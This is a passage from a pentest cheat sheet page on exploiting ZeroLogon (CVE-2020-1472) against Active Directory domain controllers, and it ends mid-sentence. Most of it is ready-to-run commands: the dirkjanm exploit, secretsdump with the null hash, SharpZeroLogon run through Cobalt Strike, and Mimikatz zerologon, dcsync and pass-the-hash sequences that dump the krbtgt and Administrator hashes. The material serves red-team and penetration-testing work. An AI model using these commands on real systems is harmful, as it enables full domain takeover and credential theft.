# ZeroLogon - Internal All The Things
URL: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/ZeroLogon/

ZeroLogon - Internal All The Things

# ZeroLogon

> CVE-2020-1472

Exploitation:

1. Spoofing the client credential
2. Disabling signing and sealing
3. Spoofing a call
4. Changing a computer's AD password to null
5. From password change to domain admin
6. reset the computer's AD password in a proper way to avoid any Deny of Service

Tools:

- `cve-2020-1472-exploit.py` - Python script from dirkjanm

```
# Check (https://github.com/SecuraBV/CVE-2020-1472)
proxychains python3 zerologon_tester.py DC01 172.16.1.5

$ git clone https://github.com/dirkjanm/CVE-2020-1472.git

# Activate a virtual env to install impacket
$ python3 -m venv venv
$ source venv/bin/activate
$ pip3 install .

# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5

# Find the old NT hash of the DC
proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'

# Restore password from secretsdump 
# secretsdump will automatically dump the plaintext machine password (hex encoded) 
# when dumping the local registry secrets on the newest version
python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
deactivate

```

- `nccfsas` - .NET binary for Cobalt Strike's execute-assembly

```
git clone https://github.com/nccgroup/nccfsas
# Check
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local

# Resetting the machine account password
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset

# Testing from a non Domain-joined machine
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch

# Now reset the password back

```

- `Mimikatz` - 2.2.0 20200917 Post-Zerologon

```
privilege::debug
# Check for the CVE
lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$

# Exploit the CVE and set the computer account's password to ""
lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit

# Execute dcsync to extract some hashes
lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm

# Pass The Hash with the extracted Domain Admin hash
sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN

# Use IP address instead of FQDN to force NTLM with Windows APIs 
# Reset password to Waza1234/Waza1234/Waza1234/
# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584
lsadump::postzerologon /target:10.10.10.10 /account:DC01$

```

- `netexec` - only check

```
netexec smb 10.10.10.10 -u username -p password -d domain -M zerologon

```

A 2nd approach to exploit zerologon is done by relaying authentica